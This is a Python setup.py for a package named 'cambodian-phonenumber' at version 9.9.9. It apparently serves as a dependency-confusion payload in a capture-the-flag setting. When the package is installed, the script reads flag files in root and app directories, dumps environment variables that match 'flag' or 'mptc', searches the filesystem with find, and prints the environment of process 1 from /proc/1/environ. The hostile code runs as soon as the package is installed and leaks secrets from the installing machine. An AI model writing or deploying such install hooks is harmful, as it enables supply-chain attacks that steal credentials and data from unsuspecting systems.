import os, subprocess, glob
from setuptools import setup

# Read flag
flag = ""
for path in ["/flag", "/flag.txt", "/root/flag.txt", "/root/flag", "/home/flag.txt", "/app/flag.txt"]:
    try:
        flag = open(path).read()
        print("[FLAG]:", flag)
        break
    except: pass

if not flag:
    # Try env vars
    for k,v in os.environ.items():
        if "flag" in k.lower() or "mptc" in v.lower() if isinstance(v,str) else False:
            print("[ENV FLAG]:", k, "=", v)
    # Find flag files
    try:
        r = subprocess.run(["find", "/", "-maxdepth", "5", "-name", "*flag*", "-not", "-path", "*/proc/*"], capture_output=True, text=True, timeout=5)
        print("[FIND]:", r.stdout)
    except: pass
    # Show /proc/1/environ
    try:
        print("[ENV]:", open("/proc/1/environ").read().replace(chr(0), "\n"))
    except: pass

setup(name="cambodian-phonenumber", version="9.9.9")
